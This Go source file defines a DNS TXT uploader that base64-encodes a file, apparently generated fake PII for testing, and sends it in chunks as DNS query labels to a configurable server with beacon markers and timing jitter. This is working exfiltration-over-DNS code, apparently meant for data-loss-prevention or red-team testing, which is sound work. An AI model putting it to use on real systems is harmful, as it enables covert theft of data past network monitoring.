package uploader

import (
	"encoding/base64"
	"strconv"
	"os"
	"io/ioutil"
	"log"
	"math"
)

type DnsTxtUpload struct {
	ip string
	port int
	domain string
	size int
	file string
	offset int
	jitter float64
}

func (d *DnsTxtUpload) Upload() {
	// Generate PII data file to exfiltrate
	filename := ""
	if d.file == "" {
		filename = createPiiFile(d.size)
		log.Printf("PII data generated at %s", filename)
	} else {
		filename = d.file
	}
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return
	}

	// Generate UID - B64 encoded hostname
	hostname, _ := os.Hostname()
	uid := base64.StdEncoding.EncodeToString([]byte(hostname))

	// Signal start of data transfer - n.n.(uid).(domain)
	log.Printf("Sending initial beacon to %s", uid)
	domain := "n.n." + uid + "." + d.domain
	dnsTXTQuery(d.ip, d.port, domain, d.offset, d.jitter)

	// less data sent per query > more reliable output
	log.Printf("Sending PII data to %s", uid)
	encoded := base64.StdEncoding.EncodeToString(data)
	totalQuery := int(math.Ceil(float64(len(encoded)) / float64(45)))
	for i := 0; i < totalQuery ; i++ {
		startIdx := i*45
		endIdx := (i+1)*45
		if endIdx > len(encoded) {
			endIdx = len(encoded)
		}

		// Exfiltrate data via labels - (data).(idx).(uid).(domain)
		domain := encoded[startIdx:endIdx] + "." + strconv.Itoa(i) + "." + uid + "." + d.domain
		dnsTXTQuery(d.ip, d.port, domain, d.offset, d.jitter)
	}

	// Signal end of data transfer - f.f.(uid).(domain)
	log.Printf("Finished sending PII data to %s", uid)
	domain = "f.f." + uid + "." + d.domain
	dnsTXTQuery(d.ip, d.port, domain, d.offset, d.jitter)

	//cleanup when pii file auto generated
	if d.file == "" {
		log.Printf("Cleaning up PII file %s", filename)
		cleanupPiiFile(filename)
	}
}